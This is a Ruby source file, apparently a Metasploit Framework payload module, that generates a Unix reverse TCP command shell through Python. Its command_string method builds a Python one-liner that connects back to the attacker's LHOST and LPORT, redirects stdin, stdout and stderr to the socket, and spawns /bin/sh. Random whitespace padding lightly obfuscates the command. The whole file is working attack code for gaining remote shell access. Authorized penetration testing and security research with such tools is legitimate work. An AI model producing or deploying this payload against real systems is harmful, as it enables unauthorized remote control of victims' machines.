##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule
  CachedSize = :dynamic

  include Msf::Payload::Single
  include Msf::Payload::Python
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(
      merge_info(
        info,
        'Name' => 'Unix Command Shell, Reverse TCP (via Python)',
        'Version' => '$Revision: 1 $',
        'Description' => 'Connect back and create a command shell via Python',
        'Author' => 'bcoles',
        'License' => MSF_LICENSE,
        'Platform' => 'unix',
        'Arch' => ARCH_CMD,
        'Handler' => Msf::Handler::ReverseTcp,
        'Session' => Msf::Sessions::CommandShell,
        'PayloadType' => 'cmd',
        'RequiredCmd' => 'python',
        'Payload' => { 'Offsets' => {}, 'Payload' => '' }
      )
    )
    register_options(
      [
        OptString.new('SHELL', [ true, 'The system shell to use', '/bin/sh' ])
      ]
    )
    register_advanced_options(
      [
        OptString.new('PythonPath', [true, 'The path to the Python executable', 'python'])
      ]
    )
  end

  def generate(_opts = {})
    return super + command_string
  end

  #
  # Generate random whitespace
  #

  def random_padding
    ' ' * rand(10)
  end

  #
  # Generate command string
  #

  def command_string
    raw_cmd = "import socket,subprocess,os;host=\"#{datastore['LHOST']}\";port=#{datastore['LPORT']};s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((host,port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(\"#{datastore['SHELL']}\")"
    cmd = raw_cmd.gsub(/,/, "#{random_padding},#{random_padding}").gsub(/;/, "#{random_padding};#{random_padding}")
    "#{datastore['PythonPath']} -c \"#{py_create_exec_stub(cmd)}\""
  end
end
